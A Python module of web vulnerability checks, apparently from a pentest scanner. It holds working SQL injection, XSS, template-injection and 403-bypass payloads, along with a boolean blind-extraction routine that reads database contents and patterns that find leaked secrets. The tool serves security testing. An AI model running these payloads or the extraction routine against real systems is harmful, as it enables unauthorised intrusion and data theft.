"""Detection checks. Each returns a finding dict or None.

Confidence model (the anti-self-fool rule): a raw length delta is NEVER a
finding. SQL injection requires a DBMS error marker or a TRUE/FALSE
differential on a stable state anchor; XSS requires the raw probe
(including its quote/bracket) to come back reflected. Timing findings are
always marked for manual verification — a slow network can fake them.
"""
import json
import os
import re
import urllib.parse

SQL_ERRORS = [
    ("sqlite", re.compile(r"sqlite3\.[A-Za-z]+Error|sqlite_error|unrecognized token", re.I)),
    ("mysql", re.compile(r"you have an error in your sql syntax|mysql_fetch|ERROR \d{4} \(1", re.I)),
    ("postgres", re.compile(r"pg_query\(\)|PostgreSQL.*ERROR|syntax error at or near", re.I)),
    ("oracle", re.compile(r"ORA-\d{5}", re.I)),
    ("mssql", re.compile(r"Microsoft SQL Native Client|Unclosed quotation mark|Msg \d+, Level", re.I)),
]

_ROW = re.compile(r"<li", re.I)


def _inject(base, value):
    """base must contain the literal placeholder TEST as the param value."""
    return base.replace("TEST", urllib.parse.quote(value, safe=""))


def check_sqli(base, sess):
    """Error-marker sniff + TRUE/FALSE differential oracle."""
    url_err, url_true, url_false = _inject(base, "'"), _inject(base, "' OR '1'='1"), _inject(base, "' AND '1'='2")
    r_err = sess.fetch(url_err)
    r_true = sess.fetch(url_true)
    r_false = sess.fetch(url_false)
    marker = next((name for name, rx in SQL_ERRORS if rx.search(r_err.body or "")), None)
    a_true, a_false = len(_ROW.findall(r_true.body)), len(_ROW.findall(r_false.body))
    differential = (r_true.status == 200 and a_true > a_false and a_false <= len(_ROW.findall(r_err.body)))
    conf = []
    if marker:
        conf.append(f"DBMS error marker: {marker}")
    if differential:
        conf.append(f"TRUE/FALSE differential confirmed ({a_true} vs {a_false} state rows)")
    if not conf:
        return None
    return {"check": "SQL injection", "confidence": conf,
            "vectors": {"error": url_err, "true": url_true, "false": url_false}}


def blind_extract(base, sess, sql_expr, max_len=64):
    """Boolean-based blind extraction of one SELECT expression (lab-proven chain).

    Oracle: TRUE page contains >0 state rows, FALSE contains none. Returns the
    extracted string, or None when the oracle never fires.
    """
    def oracle(cond):
        # trailing "--" comments out whatever the app appends after the param
        r = sess.fetch(_inject(base, f"' AND ({cond}) AND '1'='1' -- "))
        return len(_ROW.findall(r.body)) > 0

    if not oracle("1=1") or oracle("1=2"):
        return None
    length = 0
    for cand in range(1, max_len + 1):
        if oracle(f"length(({sql_expr}))>={cand}"):
            length = cand
        else:
            break
    if not length:
        return None
    out = []
    for pos in range(1, length + 1):
        ch = ""
        # char-equality (not ascii()): portable across sqlite/mysql/postgres
        for code in range(32, 127):
            if oracle(f"substr(({sql_expr}),{pos},1)='{chr(code)}'"):
                ch = chr(code)
                break
        out.append(ch)
    return "".join(out)


# --- time-based blind (stacked delay) --------------------------------------

TIME_PAYLOADS = [
    "' AND SLEEP(2) -- ",                      # MySQL
    "' AND (SELECT SLEEP(2)) -- ",             # MySQL subquery form
    "'; select pg_sleep(2) -- ",               # PostgreSQL
    "'; WAITFOR DELAY '0:0:2' -- ",            # MSSQL
]
SLEEP_SEC = 2.0
TIME_MARGIN = 1.2  # probe must beat baseline by at least this many seconds


def check_time_blind(base, sess):
    """Stacked-delay detection: median probe latency must exceed baseline.

    Timing is the weakest signal we emit — always flagged for manual recheck
    (network jitter and slow backends fake it).
    """
    def median(times):
        s = sorted(times)
        return s[len(s) // 2]

    base_lats = [sess.timed_fetch(_inject(base, "' AND '1'='1' -- "))[1] for _ in range(2)]
    baseline = median(base_lats)
    hits = []
    for payload in TIME_PAYLOADS:
        r, lat = sess.timed_fetch(_inject(base, payload))
        if lat >= baseline + TIME_MARGIN and r.status >= 0:
            hits.append({"payload": payload, "latency": round(lat, 2)})
    if not hits:
        return None
    h = hits[0]
    return {"check": "Time-based blind SQLi", "manual_verify": True,
            "confidence": [f"baseline {baseline:.2f}s vs {h['latency']}s on {SLEEP_SEC}s stacked-delay payload",
                           "timing can be faked by network jitter — retest manually before reporting"],
            "vectors": {"url": _inject(base, h["payload"])}}


# --- reflected XSS -----------------------------------------------------------

_XSS_PROBE_TPL = '{tok}"onmouseover=9>'


def check_xss(base, sess, token):
    """Reflected XSS: probe must come back byte-identical (quote not encoded)."""
    probe = _XSS_PROBE_TPL.format(tok=token)
    r = sess.fetch(_inject(base, probe))
    if r.status != 200 or probe not in r.body:
        return None
    payload = f'<img src=1 onerror="document.title=\'{token}X\'">'
    r2 = sess.fetch(_inject(base, payload))
    if payload in r2.body:
        return {"check": "Reflected XSS",
                "confidence": ["raw reflection of quote+bracket; event-handler payload reflected unescaped"],
                "vectors": {"probe": _inject(base, probe), "payload": _inject(base, payload)}}
    return None


# --- SSTI (server-side template injection) -----------------------------------

def _ssti_probes():
    # random 3x4-digit multiplication: product collision by chance is ~0,
    # and the raw echo of an unevaluated probe never contains the product.
    a = int.from_bytes(os.urandom(2), "big") % 900 + 100
    b = int.from_bytes(os.urandom(2), "big") % 9000 + 1000
    product = str(a * b)
    exprs = [f"{{{{{a}*{b}}}}}", f"${{{a}*{b}}}", f"<%= {a}*{b} %>", f"#{{{a}*{b}}}"]
    return exprs, product


def check_ssti(base, sess):
    """Template evaluation: arithmetic probe comes back COMPUTED, not echoed."""
    exprs, product = _ssti_probes()
    for expr in exprs:
        url = _inject(base, expr)
        r = sess.fetch(url)
        if r.status == 200 and product in r.body and expr not in r.body:
            return {"check": "Server-side template injection",
                    "confidence": [f"{expr!r} evaluated to {product} (raw probe absent — engine computed it)"],
                    "vectors": {"url": url}}
    return None


# --- open redirect -------------------------------------------------------------

REDIRECT_PARAMS = r"(?:url|next|redirect|target|return|dest|to|go|redir)"
_REDIRECT_PARAMS = re.compile(rf"[?&](\w*{REDIRECT_PARAMS}\w*)=", re.I)

REDIRECT_ENDPOINTS = ("/?to=TEST", "/?redirect=TEST", "/go?to=TEST", "/redirect?url=TEST", "/login?next=TEST", "/reset?to=TEST")


def _swap_param(page, name, new_value):
    """Replace the value of query param *name* cleanly (no template leftovers)."""
    u = urllib.parse.urlparse(page)
    qs = urllib.parse.parse_qsl(u.query, keep_blank_values=True)
    out = [(k, new_value if k.lower() == name else v) for k, v in qs]
    return u._replace(query=urllib.parse.urlencode(out)).geturl()


def check_open_redirect(root, sess, target=""):
    """Swap redirect-ish params for an external probe host; a 30x to it = hit."""
    evil = "https://evil.example.com/redirect-probe"
    pages = []
    if target and _REDIRECT_PARAMS.search(target):
        pages.append(target)
    pages += [root + p for p in REDIRECT_ENDPOINTS]
    for page in pages:
        for m in _REDIRECT_PARAMS.finditer(page):
            cand = _swap_param(page, m.group(1), evil)
            resp = sess.fetch(cand)
            loc = resp.headers.get("location", "")
            if resp.status in (301, 302, 303, 307, 308) and urllib.parse.urlparse(loc).netloc == "evil.example.com":
                return {"check": "Open redirect", "confidence": [f"{resp.status} Location -> {loc}"],
                        "vectors": {"url": cand}}
    return None


# --- host header injection (password-reset poisoning class) --------------------

HOST_ENDPOINTS = ("/", "/reset", "/forgot", "/forgot-password", "/login")
EvilHost = None  # set per-scan via check_host_header(token)


def check_host_header(root, sess, token):
    """Send a canary Host header; if it lands in the body or a link -> injected."""
    evil = f"awhost-{token}.example.com"
    for path in HOST_ENDPOINTS:
        url = root + path
        r = sess.fetch(url, headers={"Host": evil})
        if r.status >= 0 and evil in r.body:
            # locate the exact context so hunters can report without guessing
            ctx = next((line.strip() for line in r.body.splitlines() if evil in line), "")
            return {"check": "Host header injection",
                    "confidence": [f"canary Host reflected in response of {path}", f"evidence: {ctx[:160]}"],
                    "vectors": {"url": url, "header": f"Host: {evil}"}}
    return None


# --- 403/401 bypass battery ------------------------------------------------------

BYPASS_PATHS = ["/{p}/", "/{p}.", "/{p}..;", "/{p}..%3b", "/%2e{p}", "/{p}%20", "//{p}"]
BYPASS_HEADERS = [("X-Forwarded-For", "127.0.0.1"), ("X-Original-URL", "/{p}"), ("X-Rewrite-URL", "/{p}")]


def check_forbidden_bypass(sess, forbidden_url):
    """Given a 401/403'd URL, try the canonical bypass battery; a 200 = HIT."""
    u = urllib.parse.urlparse(forbidden_url)
    p = u.path
    root = f"{u.scheme}://{u.netloc}"
    tried = []
    for tpl in BYPASS_PATHS:
        cand = root + tpl.format(p=p)
        tried.append(cand)
        r = sess.fetch(cand)
        if r.status == 200:
            return {"check": "403 bypass", "confidence": [f"{p} was 403, {tpl.format(p=p)} returned 200"],
                    "vectors": {"url": cand}}
    for name, tpl in BYPASS_HEADERS:
        cand = root + p
        r = sess.fetch(cand, headers={name: tpl.format(p=p)})
        if r.status == 200:
            return {"check": "403 bypass", "confidence": [f"{p} was 403, 200 with header {name}"],
                    "vectors": {"url": cand, "header": f"{name}: {tpl.format(p=p)}"}}
    return None


# --- headers / cookies -----------------------------------------------------------

HDR_FLAGS = {
    "content-security-policy": "missing CSP",
    "x-frame-options": "missing X-Frame-Options",
    "strict-transport-security": "missing HSTS (HTTPS only)",
    "x-content-type-options": "missing X-Content-Type-Options",
    "referrer-policy": "missing Referrer-Policy",
    "permissions-policy": "missing Permissions-Policy",
}


def check_headers(root, sess):
    r = sess.fetch(root + "/")
    if r.status < 0:
        return None
    have = {k.lower() for k in r.headers}
    flags = [f"{h} ({why})" for h, why in HDR_FLAGS.items() if h not in have]
    srv = r.headers.get("server")
    if srv and re.search(r"\d+\.\d+", srv):
        flags.append(f"server version disclosure: {srv}")
    if not flags:
        return None
    return {"check": "Security headers", "confidence": flags, "severity_note": "informational"}


# --- exposed paths ----------------------------------------------------------------

COMMON_PATHS = ("/.env", "/.git/HEAD", "/config.bak", "/backup.zip", "/phpinfo.php",
                "/server-status", "/admin", "/login", "/wp-login.php", "/.DS_Store",
                "/web.config", "/composer.json", "/.git/config")

LEAK_MARKERS = {
    "/.env": re.compile(r"(?:^|\n)[A-Z_]+=\S", re.M),
    "/.git/HEAD": re.compile(r"^ref: "),
    "/.git/config": re.compile(r"\[core\]|\[remote"),
    "/composer.json": re.compile(r'"require"\s*:'),
    "/web.config": re.compile(r"<configuration", re.I),
}


def check_paths(root, sess):
    hits = []
    conf_extra = []
    for path in COMMON_PATHS:
        r = sess.fetch(root + path)
        rx = LEAK_MARKERS.get(path)
        leak = bool(rx and rx.search(r.body))
        cookie = r.headers.get("set-cookie", "")
        if "=" in cookie and ";" in cookie:
            missing = [a for a in ("httponly", "secure", "samesite") if a not in cookie.lower()]
            if missing:
                conf_extra.append(f"{path} sets cookie missing: {', '.join(missing)}")
        if r.status == 200 and (leak or not path.startswith("/.")):
            hits.append({"path": path, "status": r.status, "sensitive_leak": leak})
        elif r.status in (401, 403):
            hits.append({"path": path, "status": r.status, "forbidden": True})
    if not hits and not conf_extra:
        return None
    return {"check": "Exposed paths",
            "confidence": [f"{len(hits)} reachable"] + conf_extra, "paths": hits}


# --- JS bundle secret sweep --------------------------------------------------------

JS_SECRET_PATTERNS = [
    ("AWS access key", re.compile(r"AKIA[0-9A-Z]{16}")),
    ("Google API key", re.compile(r"AIza[0-9A-Za-z\-_]{35}")),
    ("GitHub token", re.compile(r"ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{60,}")),
    ("Stripe key", re.compile(r"sk_(?:live|test)_[A-Za-z0-9]{24,}")),
    ("JWT", re.compile(r"eyJ[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{10,}")),
    ("Private key block", re.compile(r"-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----")),
    ("Generic hardcoded credential", re.compile(r"""["']?(?:api[_-]?key|secret|token|passwd|password)["']?\s*[:=]\s*["'][^"']{12,40}["']""", re.I)),
]


def _mask(val):
    return val[:8] + "…" + val[-4:] if len(val) > 20 else val[:3] + "…"


def check_js_secrets(sess, root, pages):
    """Sweep same-origin JS bundles for leaked credentials. Snippets are MASKED
    in the report on purpose — a scanner must not exfiltrate secrets to disk."""
    hits = []
    urls = [u for u in pages if u.endswith(".js") or ".js?" in u][:25]
    for js in urls:
        r = sess.fetch(js if js.startswith("http") else root + js)
        if r.status != 200:
            continue
        for name, rx in JS_SECRET_PATTERNS:
            for m in rx.finditer(r.body):
                line_no = r.body.count("\n", 0, m.start()) + 1
                hits.append({"source": js, "type": name, "match": _mask(m.group(0)), "line": line_no})
    if not hits:
        return None
    return {"check": "Secrets in JavaScript", "confidence": [f"{len(hits)} candidate secret(s) in {len(urls)} bundle(s)"],
            "secrets": hits}


# --- GraphQL ------------------------------------------------------------------------

GRAPHQL_PATHS = ("/graphql", "/api/graphql", "/v1/graphql", "/graphiql", "/query")
_INTROSPECT = json.dumps({"query": "{ __schema { queryType { name } } }"})


def check_graphql(root, sess):
    """POST a read-only introspection probe; echoed schema = data model exposed."""
    for path in GRAPHQL_PATHS:
        r = sess.post(root + path, _INTROSPECT)
        if r.status == 200 and "__schema" in r.body:
            return {"check": "GraphQL introspection enabled",
                    "confidence": ["__schema introspection accepted — full data model readable; depth-limit/auth checks needed"],
                    "vectors": {"endpoint": root + path}}
    return None


# --- WAF / CDN fingerprint -------------------------------------------------------------

WAF_SIGNATURES = [
    ("Cloudflare", re.compile(r"cf-ray|cloudflare|cdn-cf", re.I)),
    ("AWS WAF / CloudFront", re.compile(r"x-amz-cf-id|awswaf|cloudfront", re.I)),
    ("Akamai", re.compile(r"akamai|x-akamai", re.I)),
    ("mod_security", re.compile(r"mod_security|blocked because.*security rule", re.I)),
    ("Imperva/Incapsula", re.compile(r"incapsula|x-i-cdn|imperva", re.I)),
    ("Wallarm", re.compile(r"wallarm", re.I)),
    ("Fastly", re.compile(r"served-by.*cache[-.]|x-timer", re.I)),
]


def check_waf(root, sess):
    """Fingerprint defensive layers from headers + a benign suspicious payload.

    Informational, but it changes a hunter's whole encoding strategy — knowing
    Cloudflare vs mod_security is the difference between wasting an hour and
    finding a real bypass path.
    """
    url = root + "/?q=" + urllib.parse.quote("'<script>alert(1)</script>", safe="")
    r = sess.fetch(url)
    blob = " ".join(f"{k}:{v}" for k, v in r.headers.items()) + " " + (r.body or "")[:4000]
    named = [name for name, rx in WAF_SIGNATURES if rx.search(blob)]
    blocking = r.status in (403, 405, 406, 429) and "blocked" in (r.body or "").lower()
    if not named and not blocking:
        return None
    conf = (named or []) + (["suspicious payload rejected outright"] if blocking else [])
    if named and not blocking:
        conf.append("detected via passive headers; active-block behaviour unconfirmed")
    return {"check": "WAF/CDN fingerprint", "confidence": conf, "severity_note": "informational",
            "vectors": {"url": url}}
